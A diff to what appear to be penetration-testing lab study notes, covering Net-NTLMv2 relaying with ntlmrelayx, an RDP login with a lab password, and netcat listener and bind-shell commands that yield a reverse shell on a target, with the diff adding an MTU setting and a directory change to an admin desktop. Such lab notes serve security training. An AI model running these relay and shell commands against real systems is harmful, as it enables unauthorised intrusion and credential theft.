@@ -877,6 +877,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       ```
    - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
   - Relaying Net-NTLMv2
+    - sudo ip l s dev tun0 mtu 1250  
     - bind shell to create an SMB connection to Kali > forward to another target (UAC disabled)
     - [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): setting up SMB server and relaying authentication
     - Starting ntlmrelayx for a Relay-attack targeting FILES02
@@ -897,7 +898,8 @@ $EncodedText
     - netcat listner `nc -nvlp 8080`
     - create VM1 SMB connection `nc 192.168.139.211 5555` (target ip and port) to kali  
       `dir \\192.168.45.181\test`  
-    - Incoming reverse shell successfully > hostname
+    - Incoming reverse shell successfully > hostname  
+    - `cd "C:\Users\files02admin\Desktop"`  
   - Windows credential guard  
 
 ### 16. Antivirus evasion  
